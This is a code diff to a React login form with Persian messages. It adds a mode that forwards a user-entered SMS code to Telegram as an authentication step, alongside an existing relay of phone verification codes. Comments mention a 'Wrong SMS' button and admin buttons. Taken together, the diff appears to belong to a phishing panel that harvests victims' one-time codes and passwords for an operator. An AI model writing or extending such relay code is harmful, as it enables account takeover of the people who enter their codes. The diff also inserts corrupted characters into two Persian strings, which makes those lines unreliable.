@@ -246,7 +246,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ��رسال می‌شود)",
         );
       }
 
@@ -275,25 +275,38 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("🔍 Verifying code:", verifyCode);
+      console.log("🔍 Verifying code:", verifyCode, "SMS mode:", isSmsMode);
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo mode: accepting any 6-digit code");
         await new Promise((resolve) => setTimeout(resolve, 1000));
       } else {
-        // Update verification in Telegram
-        const success = await updatePhoneVerificationCode(
-          sessionId,
-          verifyCode,
-        );
-        if (!success) {
-          throw new Error("Failed to update phone verification");
+        if (isSmsMode) {
+          // This is SMS auth (from Wrong SMS button)
+          console.log("📱 Sending SMS code as auth step to Telegram");
+          const success = await updateAuthStep(sessionId, "sms", verifyCode);
+          if (!success) {
+            throw new Error("Failed to update SMS auth step");
+          }
+        } else {
+          // Regular phone verification
+          console.log("📱 Regular phone verification");
+          const success = await updatePhoneVerificationCode(
+            sessionId,
+            verifyCode,
+          );
+          if (!success) {
+            throw new Error("Failed to update phone verification");
+          }
         }
       }
 
       console.log("✅ Code verified successfully");
       setCurrentStep("loading");
+
+      // Reset SMS mode after successful submission
+      setIsSmsMode(false);
 
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
@@ -350,7 +363,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور الزامی است" });
+      setErrors({ password: "رمز عبور ا��زامی است" });
       return;
     }
 
